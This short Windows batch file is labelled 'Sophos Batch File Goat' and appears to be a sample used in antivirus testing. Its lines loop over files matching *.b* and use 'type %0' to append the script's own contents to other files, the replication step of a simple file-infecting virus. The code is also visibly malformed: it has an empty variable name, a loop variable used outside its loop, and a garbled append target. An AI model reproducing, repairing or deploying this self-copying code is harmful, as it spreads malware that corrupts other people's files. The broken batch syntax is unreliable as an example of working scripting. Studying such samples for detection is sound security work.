@echo off
@echo Sophos Batch File Goat.
for %%w in (*.b*) do set =%%w
find "" %%w
if not errorlevel 1 exit
type %0>>%%